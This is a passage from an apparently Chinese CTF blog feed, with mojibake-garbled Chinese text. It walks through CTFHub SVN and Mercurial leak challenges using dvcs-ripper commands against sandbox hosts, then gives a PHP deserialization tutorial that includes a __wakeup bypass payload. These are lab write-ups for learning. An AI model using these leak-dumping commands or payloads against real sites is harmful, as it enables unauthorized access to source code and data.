src="https://img-blog.csdnimg.cn/20201024231829893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†GitHackerç›®å½•ä¸‹ä¼šç”Ÿæˆä¸¤ä¸ªä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€<br><img src="https://img-blog.csdnimg.cn/20201024232158129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>flagå°±åœ¨è®°äº‹æœ¬ä¸­<br><img src="https://img-blog.csdnimg.cn/20201024232234408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="SVNæ³„éœ²"><a href="#SVNæ³„éœ²" class="headerlink" title="SVNæ³„éœ²"></a>SVNæ³„éœ²</h2><p>é¢˜ç›®æè¿°ï¼šå½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚<br><img src="https://img-blog.csdnimg.cn/2020111820454290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>éœ€è¦ç”¨åˆ°<code>dvcs-ripper</code>è¿™ä¸ªå·¥å…·</p><p>å®‰è£…dvcs-ripper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">git clone https://github.com/kost/dvcs-ripper.git<br></code></pre></td></tr></table></figure><p>å®‰è£…ä¾èµ–åŒ…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl<br></code></pre></td></tr></table></figure><p>å®‰è£…å¤±è´¥ï¼Œå…ˆæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå†é‡æ–°æ‰§è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span>  <br></code></pre></td></tr></table></figure><p>dvcs-ripperå·¥å…·ç”¨æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./rip-git.pl -v -u http://challenge-bd3813f36ed0e21c.sandbox.ctfhub.com:<span class="hljs-number">10080</span>/.svn/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175105515.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹ç›®å½•ç»“æ„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ls <span class="hljs-operator">-</span>al<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175222664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥.svn/pristine/ç›®å½•ï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼Œçœ‹åˆ°å¯ç–‘æ–‡ä»¶84<br><img src="https://img-blog.csdnimg.cn/20210127175318256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥84æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶é‡Œé¢çš„å†…å®¹å³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210127175403327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="HGæ³„éœ²"><a href="#HGæ³„éœ²" class="headerlink" title="HGæ³„éœ²"></a>HGæ³„éœ²</h2><p>é¢˜ç›®æè¿°:å½“å¼€å‘äººå‘˜ä½¿ç”¨ Mercurial è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.hg æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† hg æ³„éœ²æ¼æ´ã€‚</p><p>ä½¿ç”¨<code>dvcs-ripper</code>å·¥å…·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">.<span class="hljs-operator">/</span>rip<span class="hljs-operator">-</span>hg.pl <span class="hljs-operator">-</span>v <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>challenge<span class="hljs-number">-05407</span>d8a0c1ffb04.sandbox.ctfhub.com:<span class="hljs-number">10080</span><span class="hljs-operator">/</span>.hg<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175822781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥.hg/store/ç›®å½•ï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/20210127180159395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹fncacheæ–‡ä»¶ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/20210127180229796.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœªçœ‹åˆ°flag_1711932515.txtä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/20210127180244399.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥æµè§ˆå™¨è®¿é—®flag_1711932515.txtï¼Œå³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210127180402891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>ä¿¡æ¯æ³„éœ²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ…è°ˆPHPååºåˆ—åŒ–æ¼æ´</title>
    <link href="/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šPHPååºåˆ—åŒ–</p> <a id="more"></a><h2 id="PHPåºåˆ—åŒ–"><a href="#PHPåºåˆ—åŒ–" class="headerlink" title="PHPåºåˆ—åŒ–"></a>PHPåºåˆ—åŒ–</h2><blockquote><p>åºåˆ—åŒ–æ˜¯å°†å˜é‡è½¬æ¢ä¸ºå¯ä¿å­˜æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚</p></blockquote><p>å‡½æ•°  <code>serialize()</code>ï¼Œå¯å°†å˜é‡è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶ä¸”åœ¨è½¬æ¢ä¸­ä¿å­˜å½“å‰å˜é‡çš„å€¼ã€‚<br>åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºåºåˆ—åŒ–ã€‚<br>æˆ‘ä»¬å…ˆå»ºä¸€ä¸ªTestå¯¹è±¡ï¼Œå­˜å…¥ä¿¡æ¯ï¼Œç„¶åç›´æ¥è¾“å‡ºå¯¹è±¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br>    print_r(<span class="hljs-variable">$m</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Test <span class="hljs-keyword">Object</span><br>(<br>    [id] =&gt; <span class="hljs-number">1</span><br>    [name] =&gt; admin<br>    [password] =&gt; admins<br>)<br></code></pre></td></tr></table></figure><p>å…ˆnewä¸€ä¸ªå®ä¾‹$mï¼Œå†ç”¨<code>serialize()</code>å‡½æ•°å°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åè¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$m</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–åçš„ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;root&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;roots&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹è¾“å‡ºç»“æœï¼š<br><img src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é»‘è‰²ç®­å¤´ï¼Œå­—æ¯Oä»£è¡¨Objectå¯¹è±¡ï¼›å¦‚æœæ˜¯Aï¼Œåˆ™ä»£è¡¨Arrayæ•°ç»„ã€‚<br>é»„è‰²ç®­å¤´ï¼Œæ•°å­—4ï¼Œä»£è¡¨å¯¹è±¡åç§°Testå 4ä¸ªå­—ç¬¦ã€‚<br>æ©™è‰²ç®­å¤´ï¼Œæ•°å­—3ï¼Œä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰3ä¸ªå˜é‡ã€‚<br>çº¢è‰²ç®­å¤´ï¼Œå­—æ¯sä»£è¡¨stringç±»å‹ï¼Œiä»£è¡¨intç±»å‹ã€‚<br>ç´«è‰²ç®­å¤´ï¼Œæ•°å­—2ï¼Œä»£è¡¨å˜é‡åå 2ä¸ªå­—ç¬¦ã€‚</p><h2 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h2><blockquote><p>ååºåˆ—åŒ–æ˜¯åœ¨é€‚å½“çš„æ—¶å€™æŠŠè¿™ä¸ªå­—ç¬¦ä¸²å†è½¬åŒ–æˆåŸæ¥çš„å˜é‡ä½¿ç”¨ã€‚</p></blockquote><p>å‡½æ•°<code>unserialize</code> ï¼ŒæŠŠserializeåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å˜æˆä¸€ä¸ªå¯¹è±¡ã€‚å¯ä»¥ä»å·²å­˜å‚¨çš„è¡¨ç¤ºä¸­åˆ›å»ºPHPçš„å€¼ã€‚æ¢å¤åŸå…ˆè¢«åºåˆ—åŒ–çš„å˜é‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"> </span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>=<span class="hljs-number">1</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&quot;admin&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;admins&quot;</span>;<br> &#125;<br><span class="hljs-variable">$m</span>=<span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$m</span>-&gt;id=<span class="hljs-number">2</span>;<br><span class="hljs-variable">$m</span>-&gt;name=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$m</span>-&gt;password=<span class="hljs-string">&quot;roots&quot;</span>;<br><br><span class="hljs-variable">$val</span> = serialize(<span class="hljs-variable">$m</span>);<br><span class="hljs-variable">$Nm</span>=unserialize(<span class="hljs-variable">$val</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Nm</span>-&gt;name.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Nm</span>-&gt;id;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š<br><img src="https://img-blog.csdnimg.cn/20201012205513840.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><a href="https://www.w3cschool.cn/tools/index?name=unserialize">phpåœ¨çº¿ååºåˆ—åŒ–å·¥å…·</a><br><img src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="é­”æœ¯å‡½æ•°"><a href="#é­”æœ¯å‡½æ•°" class="headerlink" title="é­”æœ¯å‡½æ•°"></a>é­”æœ¯å‡½æ•°</h2><p>PHPé¢å‘å¯¹è±¡å˜æˆä¸­ï¼Œæœ‰ä¸€ç±»å‡½æ•°å«åšé­”æœ¯å‡½æ•°ã€‚è¿™äº›å‡½æ•°æ˜¯ä»¥<code>__</code>å¼€å¤´çš„ï¼Œä¾ç…§æŸäº›è§„åˆ™å®ä¾‹åŒ–ç±»æˆ–è€…è°ƒç”¨æŸäº›å‡½æ•°çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨è¿™äº›magicå‡½æ•°ï¼Œ</p><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>__wakeup()</td><td>è§¦å‘unserialize()æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨</td></tr><tr><td>__sleep()</td><td>è§¦å‘serialize()æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨</td></tr><tr><td>__construct()</td><td>åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè¢«è°ƒç”¨</td></tr><tr><td>__destruct()</td><td>é”€æ¯ä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè¢«è°ƒç”¨</td></tr><tr><td>__get()</td><td>è°ƒå‡ºä¸å¯è®¿é—®ï¼ˆprivateï¼Œprotectç­‰ä¿®é¥°ï¼‰å±æ€§æ—¶ä¼šè¢«è°ƒç”¨ã€‚</td></tr><tr><td>__set()</td><td>ä¿®æ”¹æˆ–å†™å…¥ä¸å¯è®¿é—®ï¼ˆprivateï¼Œprotectç­‰ä¿®é¥°ï¼‰å±æ€§æ—¶ä¼šè¢«è°ƒç”¨ã€‚</td></tr><tr><td>__toString()</td><td>ç±»å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶ä¼šè¢«è°ƒç”¨ã€‚</td></tr><tr><td>__isset()</td><td>å¯¹ä¸å¯è®¿é—®ï¼ˆprivateï¼Œprotectç­‰ä¿®é¥°ï¼‰å±æ€§ä½¿ç”¨empty()æˆ–isset()æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨ã€‚</td></tr><tr><td>__unsetï¼ˆï¼‰</td><td>å¯¹ä¸å¯è®¿é—®ï¼ˆprivateï¼Œprotectç­‰ä¿®é¥°ï¼‰å±æ€§ä½¿ç”¨unset()æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨ã€‚</td></tr><tr><td>__invoke()</td><td>å°†å®ä¾‹åŒ–å¯¹è±¡å½“ä½œæ–¹æ³•ä½¿ç”¨æ—¶ä¼šè¢«è°ƒç”¨ã€‚</td></tr></tbody></table><h2 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h2><h3 id="wakeup-å’Œ-sleep"><a href="#wakeup-å’Œ-sleep" class="headerlink" title="__wakeup()å’Œ__sleep()"></a>__wakeup()å’Œ__sleep()</h3><blockquote><p>   <strong>PHP __wakeup()å‡½æ•°æ¼æ´</strong><br>   åœ¨ç¨‹åºæ‰§è¡Œå‰ï¼Œserialize() å‡½æ•°ä¼šé¦–å…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleepã€‚å¦‚æœå­˜åœ¨ï¼Œ__sleep()æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œ ç„¶åæ‰æ‰§è¡Œä¸²è¡ŒåŒ–ï¼ˆåºåˆ—åŒ–ï¼‰æ“ä½œã€‚<br>   è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•ä¸è¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™NULLè¢«åºåˆ—åŒ–ï¼Œå¯¼è‡´ä¸€ä¸ªE_NOTICEé”™è¯¯ã€‚ä¸ä¹‹ç›¸åï¼Œunserialize()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª__wakeupæ–¹æ³•ã€‚<br>   å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡æ•°æ®ã€‚ä½†æ˜¯è¿™ä¸ªwakeup()æ˜¯å¯ä»¥è¢«ç»•è¿‡çš„__wakeup è§¦å‘äº unserilize() è°ƒç”¨ä¹‹å‰, å½“ååºåˆ—åŒ–æ—¶çš„å­—ç¬¦ä¸²æ‰€å¯¹åº”çš„å¯¹è±¡çš„æ•°ç›®è¢«ä¿®æ”¹,__wake çš„å‡½æ•°å°±ä¸ä¼šè¢«è°ƒç”¨. å¹¶ä¸”ä¸ä¼šé‡å»ºä¸ºå¯¹è±¡, ä½†æ˜¯ä¼šè§¦å‘å…¶ä»–çš„é­”æœ¯æ–¹æ³•æ¯”å¦‚__destructã€‚</p></blockquote><p>æ¥ä¸€é“é¢˜</p><p> <strong><em>[X-CTF]unserialize3</em></strong><br>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><p>æ‰“å¼€é¢˜ç›®ï¼Œè¿›è¡Œä»£ç å®¡è®¡ï¼Œå¯ä»¥çœ‹åˆ°xctfç±»åªæ‹¥æœ‰ä¸€ä¸ªpublicçš„flagå˜é‡ï¼Œå€¼ä¸º111ã€‚å¯¹xctfç±»è¿›è¡Œåºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> xctf();<br><span class="hljs-keyword">echo</span>(serialize(<span class="hljs-variable">$test</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åºåˆ—åŒ–åçš„ç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¼ å‚ç»™codeçš„ç»“æœ<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¦ç»•è¿‡<code>__wakeup</code>è¿™ä¸ªé­”æœ¯å‡½æ•°ï¼Œåˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šç»•è¿‡<code>__wakeup</code>çš„æ‰§è¡Œ</p><p>å°†ä¸Šé¢çš„åºåˆ—åŒ–åå­—ç¬¦ä¸²ï¼Œå¯¹è±¡å±æ€§ä¸ªæ•°ç”±çœŸå®å€¼1ä¿®æ”¹ä¸º2ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;xctf&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="åºåˆ—åŒ–å‚æ•°"><a href="#åºåˆ—åŒ–å‚æ•°" class="headerlink" title="åºåˆ—åŒ–å‚æ•°"></a>åºåˆ—åŒ–å‚æ•°</h2><p>åºåˆ—åŒ–å‚æ•°æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯publicã€protectedå’Œprivateï¼Œä¸‰è€…åœ¨åºåˆ—åŒ–æ—¶æœ‰æ˜æ˜¾çš„åŒºåˆ«ã€‚</p><h3 id="public"><a href="#public" 